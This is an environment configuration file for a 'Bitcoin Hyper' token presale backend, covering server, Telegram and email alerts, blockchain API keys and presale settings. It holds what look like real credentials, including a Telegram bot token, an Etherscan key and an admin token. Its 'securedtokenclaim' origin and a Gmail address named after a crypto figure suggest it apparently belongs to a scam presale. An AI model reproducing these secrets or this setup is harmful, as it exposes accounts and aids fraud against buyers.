# ============================================
# BITCOIN HYPER PRODUCTION BACKEND v3.0
# ============================================

# Server Configuration
PORT=10000
NODE_ENV=production
HOST=0.0.0.0

# ============================================
# SECURITY & ADMINISTRATION
# ============================================

# Admin Security Token - CHANGE THIS TO SOMETHING STRONG
ADMIN_TOKEN=BitcoinHyperSecureAdmin2024!@#

# Admin Wallet Address
ADMIN_ETH_WALLET=0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47

# Session Secret for production
SESSION_SECRET=your-super-secret-jwt-key-change-this-in-production

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000  # 15 minutes
RATE_LIMIT_MAX_REQUESTS=50

# ============================================
# TELEGRAM MONITORING - REQUIRED
# ============================================

# Telegram Bot Token (from @BotFather)
TELEGRAM_BOT_TOKEN=8401635143:AAGGNfovRwW9-VYEk-t9fwEbehZNZdpGC18

# Telegram Group/Chat ID for notifications
TELEGRAM_CHAT_ID=-1003714702462

# Telegram Notifications (enable/disable)
TELEGRAM_NOTIFICATIONS_ENABLED=true

# ============================================
# EMAIL NOTIFICATIONS - RECOMMENDED
# ============================================

# Email Service Configuration
EMAIL_NOTIFICATIONS_ENABLED=true
EMAIL_SERVICE=gmail  # or 'smtp', 'sendgrid', 'mailgun'

# Gmail Configuration (if using Gmail)
EMAIL_USER=your-email@gmail.com  # Your Gmail address
EMAIL_PASS=your-app-specific-password  # Google App Password

# Admin Email for notifications
ADMIN_EMAIL=barrysilbertbtc@gmail.com

# Alternative SMTP Configuration (if not using Gmail)
# SMTP_HOST=smtp.yourdomain.com
# SMTP_PORT=587
# SMTP_SECURE=true
# SMTP_USER=your-smtp-username
# SMTP_PASS=your-smtp-password

# ============================================
# BLOCKCHAIN API KEYS - RECOMMENDED FOR PRODUCTION
# ============================================

# Etherscan API Key (for Ethereum mainnet)
ETHERSCAN_API_KEY=TNA6379VCHP9MD4VEEVCUF2YKMRKFX8DZ5

# BSCScan API Key (for Binance Smart Chain)
BSCSCAN_API_KEY=your-bscscan-api-key

# PolygonScan API Key
POLYGONSCAN_API_KEY=your-polygonscan-api-key

# Arbiscan API Key (for Arbitrum)
ARBISCAN_API_KEY=your-arbiscan-api-key

# Alternative RPC URLs (fallback)
ETH_RPC_URL=https://eth.llamarpc.com
BSC_RPC_URL=https://bsc-dataseed.binance.org
POLYGON_RPC_URL=https://polygon-rpc.com
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc

# ============================================
# PRESALE SETTINGS
# ============================================

# Token Information
TOKEN_NAME=Bitcoin Hyper
TOKEN_SYMBOL=BTH
TOKEN_DECIMALS=18

# Presale Configuration
PRESALE_PRICE=0.17
MIN_ELIGIBILITY_AMOUNT=10
BASE_ALLOCATION=5000
MAX_BONUS_MULTIPLIER=5

# Presale Stages
PRESALE_START_TIMESTAMP=1738886400000  # Unix timestamp
PRESALE_END_TIMESTAMP=1741564800000    # Unix timestamp

# ============================================
# DATABASE & STORAGE (For future upgrades)
# ============================================

# MongoDB Configuration (optional - for production persistence)
# MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/bitcoinhyper?retryWrites=true&w=majority
# MONGODB_DB_NAME=bitcoinhyper

# Redis Configuration (optional - for caching and rate limiting)
# REDIS_URL=redis://localhost:6379
# REDIS_PASSWORD=your-redis-password

# ============================================
# CORS & SECURITY HEADERS
# ============================================

# Allowed Origins (add your frontend domains)
ALLOWED_ORIGINS=https://securedtokenclaim.vercel.app,https://localhost:3000,https://bitcoinhyper.io

# Security Headers
HELMET_ENABLED=true
CORS_CREDENTIALS=true

# ============================================
# LOGGING & MONITORING
# ============================================

# Log Level
LOG_LEVEL=info  # debug, info, warn, error

# Sentry Error Tracking (optional)
# SENTRY_DSN=https://your-sentry-dsn.ingest.sentry.io/project-id

# ============================================
# PERFORMANCE OPTIMIZATIONS
# ============================================

# Request Limits
REQUEST_BODY_LIMIT=10mb
REQUEST_URL_LIMIT=10mb

# Compression
COMPRESSION_ENABLED=true

# Cache Control
CACHE_CONTROL_MAX_AGE=3600  # 1 hour
